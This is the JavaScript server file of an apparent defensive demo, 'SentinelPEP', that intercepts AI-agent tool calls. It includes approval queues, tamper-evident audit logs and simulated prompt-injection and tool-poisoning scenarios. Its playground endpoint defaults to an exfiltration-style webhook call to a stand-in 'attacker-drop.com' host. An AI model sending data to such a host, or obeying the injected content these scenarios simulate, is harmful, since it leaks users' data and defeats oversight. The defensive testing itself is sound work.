import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import { CONFIG } from './config.js';
import { AuditLogger } from './audit/auditLogger.js';
import { ApprovalQueue } from './approval/approvalQueue.js';
import { PolicyEnforcementPoint } from './pep/policyEnforcementPoint.js';
import { ToolRegistry } from './tools/toolRegistry.js';
import { SimulatedAgent } from './agent/simulatedAgent.js';
import { ScenarioRunner } from './scenarios/scenarioRunner.js';
import { MCPGateway } from './mcp/mcpGateway.js';
import { SAMPLE_EMAILS } from './tools/emailSamples.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// 1. Initialize Core Security Infrastructure
const auditLogger = new AuditLogger();
const approvalQueue = new ApprovalQueue();
approvalQueue.clear(); // Ensure queue starts completely empty
const pep = new PolicyEnforcementPoint({ auditLogger, approvalQueue });
const toolRegistry = new ToolRegistry({ pep });
const agent = new SimulatedAgent({ pep, toolRegistry });
const scenarioRunner = new ScenarioRunner({ simulatedAgent: agent, auditLogger });
const mcpGateway = new MCPGateway({ pep, toolRegistry });

// Helper to parse JSON body
function parseJsonBody(req) {
  return new Promise((resolve, reject) => {
    let body = '';
    req.on('data', chunk => { body += chunk.toString(); });
    req.on('end', () => {
      if (!body.trim()) return resolve({});
      try {
        resolve(JSON.parse(body));
      } catch (err) {
        reject(new Error('Invalid JSON payload: ' + err.message));
      }
    });
    req.on('error', reject);
  });
}

// Helper to send JSON responses
function sendJson(res, statusCode, data) {
  res.writeHead(statusCode, {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, Authorization'
  });
  res.end(JSON.stringify(data));
}

// 2. HTTP Server Router
const server = http.createServer(async (req, res) => {
  const parsedUrl = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
  const pathname = parsedUrl.pathname;
  const method = req.method;

  // Handle CORS preflight
  if (method === 'OPTIONS') {
    res.writeHead(204, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization'
    });
    return res.end();
  }

  try {
    // --- STATIC ASSETS & DASHBOARD ---
    if (method === 'GET' && (pathname === '/' || pathname === '/index.html')) {
      const htmlPath = path.join(__dirname, 'public', 'index.html');
      const html = fs.readFileSync(htmlPath, 'utf8');
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return res.end(html);
    }

    // --- HEALTH & STATUS ---
    if (method === 'GET' && pathname === '/api/health') {
      return sendJson(res, 200, {
        status: 'UP',
        service: 'SentinelPEP-Gateway',
        version: '1.0.0',
        pepActive: true,
        totalAuditLogs: auditLogger.getLogs().length,
        pendingApprovals: approvalQueue.getPending().length
      });
    }

    // --- SCENARIOS BENCHMARK ---
    if (method === 'GET' && pathname === '/api/scenarios') {
      return sendJson(res, 200, { scenarios: scenarioRunner.getScenarios() });
    }

    if (method === 'POST' && pathname === '/api/scenarios/run') {
      const body = await parseJsonBody(req);
      const scenarioId = body.scenarioId;
      if (!scenarioId) {
        return sendJson(res, 400, { error: 'Missing required parameter: scenarioId' });
      }
      if (scenarioId !== 'scenario-4-high-impact-approval') {
        approvalQueue.clear();
      }
      const result = await scenarioRunner.runScenario(scenarioId, body.agentRole);
      return sendJson(res, 200, result);
    }

    if (method === 'POST' && pathname === '/api/scenarios/run-all') {
      const results = await scenarioRunner.runAllScenarios();
      return sendJson(res, 200, { results });
    }

    // --- EMAIL INBOX & UNTRUSTED INGESTION ---
    if (method === 'GET' && pathname === '/api/email/samples') {
      return sendJson(res, 200, { samples: SAMPLE_EMAILS });
    }

    if (method === 'POST' && pathname === '/api/email/process') {
      const body = await parseJsonBody(req);
      const { sender, subject, body: emailBody, agentRole = 'SupportAgent', mode = 'both' } = body;
      if (!sender || !subject) {
        return sendJson(res, 400, { error: 'Missing required email fields (sender, subject)' });
      }

      let unprotectedResult = null;
      let protectedResult = null;

      if (mode === 'unprotected' || mode === 'both') {
        unprotectedResult = await agent.runEmailUnprotected({
          sender,
          subject,
          body: emailBody || '',
          agentRole
        });
      }

      if (mode === 'protected' || mode === 'both') {
        protectedResult = await agent.runEmail({
          sender,
          subject,
          body: emailBody || '',
          agentRole
        });
      }

      return sendJson(res, 200, {
        sender,
        subject,
        unprotectedResult,
        protectedResult
      });
    }

    // --- BEFORE VS AFTER DUAL COMPARISON ---
    if (method === 'POST' && pathname === '/api/scenarios/compare') {
      const body = await parseJsonBody(req);
      const scenarioId = body.scenarioId || 'scenario-2-indirect-injection';
      const scenario = scenarioRunner.getScenarios().find(s => s.id === scenarioId) || scenarioRunner.getScenarios()[1];

      // 1. Run Unprotected Agent
      const unprotectedResult = await agent.runUnprotected({
        userPrompt: scenario.userPrompt,
        agentRole: scenario.agentRole,
        forcedScenarioId: scenario.id
      });

      // 2. Run Sentinel-Protected Agent
      const protectedResult = await agent.run({
        userPrompt: scenario.userPrompt,
        agentRole: scenario.agentRole,
        forcedScenarioId: scenario.id
      });

      return sendJson(res, 200, {
        scenarioId: scenario.id,
        title: scenario.title,
        unprotectedResult,
        protectedResult
      });
    }

    // --- INTERACTIVE PLAYGROUND (CUSTOM ATTACK TESTING) ---
    if (method === 'POST' && pathname === '/api/playground/test') {
      const body = await parseJsonBody(req);
      const { userPrompt, agentRole = 'SupportAgent', customDocumentContent, targetTool, toolArgs } = body;

      pep.resetTaintState();

      // If custom document text provided, register it in PEP
      let docInspection = null;
      if (customDocumentContent) {
        docInspection = pep.registerUntrustedData({
          sourceId: 'custom-doc-payload',
          sourceName: 'User-Provided Document',
          content: customDocumentContent,
          taintLevel: 'UNTRUSTED_CONTENT'
        });
      }

      // Intercept the target tool call
      const interception = await pep.interceptToolCall({
        agentId: 'playground-agent',
        agentRole,
        userPrompt: userPrompt || 'Custom attack testing',
        toolName: targetTool || 'send_external_webhook',
        toolArgs: toolArgs || { url: 'https://attacker-drop.com/data' }
      });

      return sendJson(res, 200, {
        docInspection,
        interception
      });
    }

    // --- POLICIES AND RBAC MATRIX ---
    if (method === 'GET' && pathname === '/api/policies') {
      return sendJson(res, 200, {
        policies: pep.policyEngine.policies,
        roles: ['SupportAgent', 'ResearchAgent', 'FinanceAgent', 'AdminAgent']
      });
    }

    // --- TAMPER-EVIDENT DEMO SIMULATOR ---
    if (method === 'POST' && pathname === '/api/audit-logs/tamper-test') {
      if (auditLogger.logs.length === 0) {
        return sendJson(res, 400, { error: 'No audit logs exist yet to tamper. Run a scenario first.' });
      }
      const targetIndex = 0;
      // Tamper with decision text in memory
      auditLogger.logs[targetIndex].decision = 'ALLOW_TAMPERED';
      const verification = auditLogger.verifyChainIntegrity();
      return sendJson(res, 200, {
        message: 'Malicious modification simulated in audit log entry 0.',
        verification
      });
    }

    // --- AGENT CUSTOM EXECUTION ---
    if (method === 'POST' && pathname === '/api/agent/run') {
      const body = await parseJsonBody(req);
      const { userPrompt, agentRole } = body;
      if (!userPrompt) {
        return sendJson(res, 400, { error: 'Missing required parameter: userPrompt' });
      }
      const result = await agent.run({ userPrompt, agentRole });
      return sendJson(res, 200, result);
    }

    // --- MODEL CONTEXT PROTOCOL (MCP) GATEWAY ---
    if (method === 'POST' && pathname === '/api/mcp') {
      const rpcRequest = await parseJsonBody(req);
      const rpcResponse = await mcpGateway.handleRpcRequest(rpcRequest);
      return sendJson(res, 200, rpcResponse);
    }

    // --- AUDIT TRAIL & CRYPTOGRAPHIC VERIFICATION ---
    if (method === 'GET' && pathname === '/api/audit-logs') {
      const limit = parseInt(parsedUrl.searchParams.get('limit') || '50', 10);
      const decision = parsedUrl.searchParams.get('decision');
      const logs = auditLogger.getLogs({ limit, decision });
      return sendJson(res, 200, { logs });
    }

    if (method === 'GET' && pathname === '/api/audit-logs/verify') {
      const verification = auditLogger.verifyChainIntegrity();
      return sendJson(res, 200, verification);
    }

    // --- HUMAN-IN-THE-LOOP (HITL) APPROVALS ---
    if (method === 'GET' && pathname === '/api/approvals') {
      return sendJson(res, 200, {
        pending: approvalQueue.getPending(),
        history: approvalQueue.getHistory()
      });
    }

    if (method === 'POST' && pathname.startsWith('/api/approvals/') && pathname.endsWith('/decide')) {
      const parts = pathname.split('/');
      const approvalId = parts[3];
      const body = await parseJsonBody(req);
      const { decision, operatorNotes } = body;

      if (decision === 'APPROVE') {
        const approvedReq = approvalQueue.approve(approvalId, operatorNotes);
        // Execute tool now that human permitted it
        const toolOutput = await toolRegistry.executeTool(approvedReq.toolName, approvedReq.toolArgs);
        return sendJson(res, 200, { status: 'APPROVED_AND_EXECUTED', approvedReq, toolOutput });
      } else if (decision === 'REJECT') {
        const rejectedReq = approvalQueue.reject(approvalId, operatorNotes);
        return sendJson(res, 200, { status: 'REJECTED', rejectedReq });
      } else {
        return sendJson(res, 400, { error: "Decision must be 'APPROVE' or 'REJECT'" });
      }
    }

    // --- SSE LIVE EVENTS STREAM ---
    if (method === 'GET' && pathname === '/api/events') {
      res.writeHead(200, {
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Access-Control-Allow-Origin': '*'
      });
      res.write(`data: ${JSON.stringify({ type: 'CONNECTED', timestamp: new Date().toISOString() })}\n\n`);

      const unsubscribeLogs = auditLogger.onLog(entry => {
        res.write(`data: ${JSON.stringify({ type: 'AUDIT_LOG', payload: entry })}\n\n`);
      });

      const unsubscribeApprovals = approvalQueue.onUpdate(event => {
        res.write(`data: ${JSON.stringify({ type: 'APPROVAL_UPDATE', payload: event })}\n\n`);
      });

      req.on('close', () => {
        unsubscribeLogs();
        unsubscribeApprovals();
      });
      return;
    }

    // --- ROLES ---
    if (method === 'GET' && pathname === '/api/roles') {
      return sendJson(res, 200, {
        roles: [
          { id: 'report-reader', label: 'Report Reader', description: 'Read-only access to approved reports. Cannot send emails, access secrets, or delete files.' },
          { id: 'support', label: 'Support Agent', description: 'Can read documents and send emails (with approval for high-impact sends).' },
          { id: 'admin', label: 'Admin', description: 'Full access to all tools including secrets vault and delete operations.' }
        ]
      });
    }

    // --- TOOL SUPPLY CHAIN ---
    if (method === 'GET' && pathname === '/api/supply-chain/tools') {
      return sendJson(res, 200, { tools: pep.supplyChain.getAllTools() });
    }

    if (method === 'POST' && pathname === '/api/supply-chain/simulate-shadow') {
      const result = pep.supplyChain.simulateShadowAttack();
      return sendJson(res, 200, { attack: 'shadow', result });
    }

    if (method === 'POST' && pathname === '/api/supply-chain/simulate-poison') {
      const result = pep.supplyChain.simulatePoisonAttack();
      return sendJson(res, 200, { attack: 'poison', result });
    }

    if (method === 'POST' && pathname.startsWith('/api/supply-chain/approve/')) {
      const toolName = decodeURIComponent(pathname.replace('/api/supply-chain/approve/', ''));
      const updated = pep.supplyChain.approveQuarantine(toolName);
      return sendJson(res, 200, { status: 'APPROVED', tool: updated });
    }

    if (method === 'POST' && pathname.startsWith('/api/supply-chain/reject/')) {
      const toolName = decodeURIComponent(pathname.replace('/api/supply-chain/reject/', ''));
      const reverted = pep.supplyChain.rejectQuarantine(toolName);
      return sendJson(res, 200, { status: 'REJECTED', tool: reverted });
    }

    if (method === 'POST' && pathname === '/api/supply-chain/reset') {
      pep.supplyChain.reset();
      return sendJson(res, 200, { status: 'RESET' });
    }

    // 404 Fallback
    return sendJson(res, 404, { error: `Endpoint '${pathname}' not found.` });

  } catch (err) {
    console.error('[Server Error]', err);
    return sendJson(res, 500, { error: 'Internal server error: ' + err.message });
  }
});

// Start Server
server.listen(CONFIG.PORT, CONFIG.HOST, () => {
  console.log(`==================================================================`);
  console.log(`🛡️  SentinelPEP Security Gateway running at http://${CONFIG.HOST}:${CONFIG.PORT}`);
  console.log(`   - Interactive Live UI: http://${CONFIG.HOST}:${CONFIG.PORT}/`);
  console.log(`   - MCP JSON-RPC Gateway: http://${CONFIG.HOST}:${CONFIG.PORT}/api/mcp`);
  console.log(`   - Audit Trail & Chain Verification: http://${CONFIG.HOST}:${CONFIG.PORT}/api/audit-logs/verify`);
  console.log(`==================================================================`);
});
